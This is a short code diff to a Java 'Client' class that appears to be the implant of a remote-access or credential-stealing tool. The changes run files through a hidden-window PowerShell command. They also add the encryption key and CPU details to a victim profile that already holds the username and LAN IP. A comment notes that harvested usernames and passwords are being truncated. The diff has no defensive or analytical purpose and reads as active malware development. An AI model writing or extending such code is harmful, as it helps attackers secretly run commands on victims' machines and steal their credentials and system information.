@@ -43,7 +43,7 @@ public class Client {
 
     private static String USERNAME = System.getProperty("user.name");
     private static String JRE_VERSION = System.getProperty("java.version");
-    private static String ARCH = System.getProperty("os.arch");
+    private static String ARCH = System.getenv("PROCESSOR_ARCHITECTURE");
 
 
     public static void main(String[] args) throws Exception {
@@ -276,9 +276,9 @@ public class Client {
                     }
 
                     String cmd = "powershell.exe -w hidden . " + fname;
-                    System.out.println("Command: " + cmd);
+                    if (debugMode){System.out.println("Command: " + cmd);}
                     // Run the command
-                    // TODO: fix bug below
+                    // TODO: fix >> CLIENT SIDE << bug below
                     // For some reason, the lines are being truncated at around 117-120 char mark, completely cutting off most usernames and passwords
 
                     ProcessBuilder builder = new ProcessBuilder(cmd.split(" "));
@@ -541,6 +541,9 @@ public class Client {
         sb.append("Java version: " + JRE_VERSION + "\n");
         sb.append("Username: " + USERNAME + "\n");
         sb.append("Architecture: " + ARCH + "\n");
+        sb.append("Encryption key: " + aesKey + "\n");
+        sb.append("CPU: " + System.getenv("PROCESSOR_IDENTIFIER") + "\n");
+        sb.append("\t - Num. CPU Cores: " + System.getenv("NUMBER_OF_PROCESSORS") + "\n");
         try {
             InetAddress inetAddress = InetAddress.getLocalHost();
             sb.append("LAN IP: " + inetAddress.getHostAddress() + "\n");
